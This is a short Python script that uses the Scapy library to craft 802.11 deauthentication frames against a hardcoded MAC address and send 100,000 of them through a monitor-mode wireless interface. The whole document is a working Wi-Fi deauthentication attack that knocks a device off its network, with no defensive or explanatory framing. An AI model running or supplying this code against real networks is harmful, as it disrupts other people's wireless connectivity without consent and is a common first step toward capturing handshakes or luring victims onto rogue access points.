from scapy.all import (
  RadioTap,    # Adds additional metadata to an 802.11 frame
  Dot11,       # For creating 802.11 frame
  Dot11Deauth, # For creating deauth frame
  sendp        # for sending packets
)

target_mac = "90:9A:4A:46:01:9F"
gateway_mac = "90:9A:4A:46:01:9F"

dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

frame = RadioTap()/dot11/Dot11Deauth(reason=7)

sendp(frame, iface="wlan0mon", count=100000, inter=0.1)
